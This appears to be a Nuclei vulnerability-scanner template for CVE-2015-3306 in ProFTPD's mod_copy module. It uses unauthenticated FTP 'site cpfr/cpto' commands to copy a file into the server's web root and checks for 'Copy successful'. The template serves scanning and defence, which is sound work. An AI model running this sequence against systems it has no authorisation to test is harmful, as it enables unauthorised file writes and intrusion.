id: CVE-2015-3306
info:
  author: pdteam
  classification:
    cve-id: CVE-2015-3306
  description: The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read
    and write to arbitrary files via the site cpfr and site cpto commands.
  name: ProFTPd RCE
  reference:
  - https://github.com/t0kx/exploit-CVE-2015-3306
  - https://www.exploit-db.com/exploits/36803/
  - http://lists.fedoraproject.org/pipermail/package-announce/2015-May/157053.html
  - http://lists.fedoraproject.org/pipermail/package-announce/2015-May/157054.html
  severity: high
  tags: cve,cve2015,ftp,rce,network,proftpd
network:
- host:
  - '{{Hostname}}'
  - '{{Host}}:21'
  inputs:
  - data: "site cpfr /proc/self/cmdline\r\n"
    read: 1024
  - data: "site cpto /tmp/.{{randstr}}\r\n"
    read: 1024
  - data: "site cpfr /tmp/.{{randstr}}\r\n"
    read: 1024
  - data: "site cpto /var/www/html/{{randstr}}\r\n"
  matchers:
  - part: raw
    type: word
    words:
    - Copy successful
  read-size: 1024
